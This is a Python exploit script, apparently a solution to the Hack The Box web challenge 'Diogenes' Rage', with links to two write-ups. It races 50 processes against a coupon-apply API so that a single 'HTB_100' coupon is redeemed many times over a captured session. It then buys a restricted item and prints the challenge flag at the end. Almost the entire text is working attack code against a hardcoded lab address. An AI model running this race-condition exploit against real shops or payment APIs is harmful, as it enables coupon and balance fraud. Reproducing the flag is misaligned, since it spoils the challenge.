#https://b3cl4ssy.tistory.com/m/481
#https://github.com/lex1010/blog/blob/b32cb0922026cf81e4b67dbdc99add152049ca31/docs/HTB/Web/diogenes_rage.md

# Python program to illustrate
# the concept of race condition
# in multiprocessing
import multiprocessing
import requests
import time

def exploit(u, d, h):
	for i in range(5):
		requests.post(u, data=d, headers=h)

def perform_transactions(cookie, u):
	url = f"http://{u}/api/coupons/apply"
	data = '{"coupon_code":"HTB_100"}'
	thread = []
	headers = {"Content-Type" : "application/json"}
	headers['Cookie'] = "session="+cookie
	start = time.time()
	for i in range(50):
		p1 = multiprocessing.Process(target=exploit, args=(url, data, headers))
		thread.append(p1)
	for j in thread:
		j.start()

	for k in thread:
		k.join()
	end = time.time()
	print(f"{end - start:.5f} sec")
	print("Done!!")

def get_session(url):
    u = f"http://{url}/api/purchase"
    d = '{"item":"A2"}'
    res = requests.post(u, data=d)
    print(res.text)
    return res.cookies['session']

def get_flag(s, url):
    u = f"http://{url}/api/purchase"
    d = '{"item":"C8"}'
    headers = {"Content-Type" : "application/json"}
    headers['Cookie'] = "session="+s
    d1 = '{"item":"A1"}'
    res = requests.post(u, data=d1, headers=headers)
    print(res.text)
    res = requests.post(u, data=d, headers=headers)
    print(res.text)
    return res.cookies

if __name__ == "__main__":
	for i in range(40):
		u = "134.122.104.91:31894"
		s = get_session(u)
		perform_transactions(s, u)
		res = get_flag(s, u)
		time.sleep(1)
		print("\n\n")

#HTB{r4c3_w3b_d3f34t_c0nsum3r1sm}
